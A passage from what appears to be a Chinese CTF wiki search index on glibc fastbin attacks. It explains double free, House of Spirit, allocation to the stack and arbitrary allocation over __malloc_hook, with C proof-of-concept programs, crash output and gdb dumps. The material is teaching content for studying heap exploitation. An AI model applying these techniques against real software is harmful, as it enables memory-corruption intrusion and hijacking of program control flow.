\u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002 /* Another simple check: make sure the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; }","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/fastbin_attack/#_4","text":"\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk1); return 0; } \u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c] ./tst[0x4005a2] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830] ./tst[0x400499] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 02200000-02221000 rw-p 00000000 00:00 0 [heap] 7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0 [stack] 7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0 [vvar] 7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk2); free(chunk1); return 0; } \u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1) \u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2) \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1) \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002 \u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=>chunk1=>chun2=>chunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; CHUNK bss_chunk; int main(void) { void *chunk1,*chunk2,*chunk3; void *chunk_a,*chunk_b; bss_chunk.size=0x21; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk2); free(chunk1); chunk_a=malloc(0x10); *(long long *)chunk_a=&bss_chunk; malloc(0x10); malloc(0x10); chunk_b=malloc(0x10); printf(\"%p\",chunk_b); return 0; } \u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x601080 <bss_chunk>: 0x0000000000000000 0x0000000000000021 0x601090 <bss_chunk+16>:0x0000000000000000 0x0000000000000000 0x6010a0: 0x0000000000000000 0x0000000000000000 0x6010b0: 0x0000000000000000 0x0000000000000000 0x6010c0: 0x0000000000000000 0x0000000000000000 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5] /lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184] ./tst[0x400636] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830] ./tst[0x4004e9] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 00bc4000-00be5000 rw-p 00000000 00:00 0 [heap] 7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0 [stack] 7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0 [vvar] 7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) _int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; }","title":"\u6f14\u793a"},{"location":"pwn/heap/fastbin_attack/#_5","text":"\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002 \u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/fastbin_attack/#house-of-spirit","text":"","title":"House Of Spirit"},{"location":"pwn/heap/fastbin_attack/#_6","text":"House of Spirit \u662f the Malloc Maleficarum \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d \u6307\u5b9a\u5730\u5740 \u7684 chunk \u7684\u76ee\u7684\u3002 \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373 fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002 fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002 fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e 2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av->system_mem \u3002 fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/fastbin_attack/#_7","text":"\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates the house of spirit attack. \\n \" ); fprintf ( stderr , \"Calling malloc() once so that it sets up its memory. \\n \" ); malloc ( 1 ); fprintf ( stderr , \"We will now overwrite a pointer to point to a fake 'fastbin' region. \\n \" ); unsigned long long * a ; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks [ 10 ] __attribute__ (( aligned ( 16 ))); fprintf ( stderr , \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n \" , sizeof ( fake_chunks ), & fake_chunks [ 1 ], & fake_chunks [ 7 ]); fprintf ( stderr , \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n \" ); fprintf ( stderr , \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n \" ); fake_chunks [ 1 ] = 0x40 ; // this is the size fprintf ( stderr , \"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n \" ); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks [ 9 ] = 0x1234 ; // nextsize fprintf ( stderr , \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n \" , & fake_chunks [ 1 ]); fprintf ( stderr , \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n \" ); a = & fake_chunks [ 2 ]; fprintf ( stderr , \"Freeing the overwritten pointer. \\n \" ); free ( a ); fprintf ( stderr , \"Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n \" , & fake_chunks [ 1 ], & fake_chunks [ 2 ]); fprintf ( stderr , \"malloc(0x30): %p \\n \" , malloc ( 0x30 )); } \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b \u279c how2heap git: ( master ) ./house_of_spirit This file demonstrates the house of spirit attack. Calling malloc () once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region ( memory of length: 80 ) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88. This chunk.size of this region has to be 16 more than the region ( to accomodate the chunk data ) while still falling into the fastbin category ( < = 128 on x64 ) . The PREV_INUSE ( lsb ) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED ( second lsb ) and NON_MAIN_ARENA ( third lsb ) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is > 2 *SIZE_SZ ( > 16 on x64 ) && < av->system_mem ( < 128kb by default for the main arena ) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58. ... note that the memory address of the *region* associated with this chunk must be 16 -byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60! malloc ( 0x30 ) : 0x7ffd9bceaa60","title":"\u6f14\u793a"},{"location":"pwn/heap/fastbin_attack/#_8","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/fastbin_attack/#alloc-to-stack","text":"","title":"Alloc to Stack"},{"location":"pwn/heap/fastbin_attack/#_9","text":"\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/fastbin_attack/#_10","text":"\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; int main(void) { CHUNK stack_chunk; void *chunk1; void *chunk_a; stack_chunk.size=0x21; chunk1=malloc(0x10); free(chunk1); *(long long *)chunk1=&stack_chunk; malloc(0x10); chunk_a=malloc(0x10); return 0; } \u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x00007fffffffde60 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk \u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20 <main_arena>: 0x0000000000000000 <=== unsorted bin 0x7ffff7dd1b28 <main_arena+8>: 0x00007fffffffde60 <=== fastbin[0] 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 \u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk 0x400629 <main+83> call 0x4004c0 <malloc@plt> \u2192 0x40062e <main+88> mov QWORD PTR [rbp-0x38], rax $rax : 0x00007fffffffde70 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]","title":"\u6f14\u793a"},{"location":"pwn/heap/fastbin_attack/#_11","text":"\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/fastbin_attack/#arbitrary-alloc","text":"","title":"Arbitrary Alloc"},{"location":"pwn/heap/fastbin_attack/#_12","text":"Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002 \u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/fastbin_attack/#_13","text":"\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230 _malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002 int main(void) { void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0; } \u8fd9\u91cc\u76840x7ffff7dd1af5\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 <__malloc_hook>: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook 